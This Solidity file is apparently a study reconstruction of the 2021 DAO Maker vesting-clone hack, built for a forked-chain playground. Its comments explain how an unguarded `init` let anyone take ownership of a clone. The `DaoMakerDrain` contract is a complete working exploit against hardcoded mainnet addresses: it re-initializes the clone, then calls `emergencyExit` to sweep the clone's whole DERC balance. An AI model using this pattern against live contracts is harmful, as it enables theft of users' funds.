// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2021-09-DaoMaker).
//
// DAO Maker deployed one minimal-proxy ("clone") vesting contract per token
// sale / SHO. Each clone `delegatecall`s into a shared implementation and is
// configured after deployment by an external `init(...)` that — among other
// things — sets `owner = msg.sender`. That initializer had NO `initializer`
// guard and NO caller restriction, so anyone could call `init` again on an
// already-live, funded clone and become its owner.
//
// The DeFiHackLabs Foundry PoC runs the whole attack INLINE in `ContractTest`
// (`address(this)` calls `init` then `emergencyExit`) — there is no standalone
// exploit contract. This file reproduces that inline attack as a self-contained
// contract (no imports, compiles anywhere), compiled into the registry forge
// project. The exploit contract calls `init` (so it becomes the clone's owner,
// since `init` does `owner = msg.sender`), then calls the now-owned
// `emergencyExit` to sweep the clone's ENTIRE DERC balance out to itself.
//
// This is faithful to the live incident: the original attacker EOA
// (0x2708cace…f92f) sent `init` + `emergencyExit` directly to four clones; we
// model one of them (the DERC clone). The vesting implementation is unverified
// on Etherscan at the fork block, so it renders as opcodes only — the
// source-mapped contract we anchor the editorial on is this exploit itself.

interface IDaoMakerClone {
    // Unguarded initializer (no `initializer` modifier, no caller check).
    // Writes owner = msg.sender + the vesting schedule + the token address.
    function init(uint256 startTime, uint256[] calldata periods, uint256[] calldata percents, address token) external;

    // Owner-only escape hatch: transfers the clone's ENTIRE token balance to
    // `recipient`. Owner-only — but `init` let the attacker become the owner.
    function emergencyExit(address recipient) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract DaoMakerDrain {
    // The DAO Maker DERC vesting clone (an EIP-1167 minimal proxy that
    // delegatecalls into the shared implementation at 0xF17CA0…8eE2).
    IDaoMakerClone constant CLONE = IDaoMakerClone(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);

    // The drained token — DeRace (DERC), 18 decimals.
    IERC20 constant DERC = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);

    function run() external {
        // 1. Re-initialize the already-live, funded clone. init() has NO guard,
        //    so this call succeeds and — critically — sets `owner = msg.sender`
        //    (this contract). The vesting params are cosmetic; the only value
        //    that matters for the theft is the implicit owner overwrite.
        //    startTime 1640984401, one 100% tranche (10000 bps) releasing after
        //    one 5,702,400-second period. (Copied verbatim from the Foundry test.)
        uint256[] memory periods = new uint256[](1);
        periods[0] = 5_702_400;
        uint256[] memory percents = new uint256[](1);
        percents[0] = 10_000; // 100.00% in basis points
        CLONE.init(1_640_984_401, periods, percents, address(DERC));

        // 2. Snapshot the clone's DERC balance before the drain — proves the
        //    loot is real (5,760,000 DERC already sitting in the clone) and not
        //    created by us. (Reconstructed from the trace; the value is read
        //    back inside emergencyExit too.)
        uint256 cloneBal = DERC.balanceOf(address(CLONE));

        // 3. Drain via the owner-only escape hatch. emergencyExit is correctly
        //    `onlyOwner`, but `init` just made THIS contract the owner, so the
        //    check passes. It reads balanceOf(clone) and transfers ALL of it to
        //    the recipient — here, this contract.
        CLONE.emergencyExit(address(this));

        // 4. Confirm the full balance arrived — the clone went to 0 and this
        //    contract received exactly `cloneBal` (5,760,000 DERC, 5.76e24 wei).
        //    A legitimate-but-powerful function (full-balance sweep to an
        //    arbitrary recipient) was reachable only because init() was left
        //    unprotected.
        assert(DERC.balanceOf(address(this)) == cloneBal);
    }
}
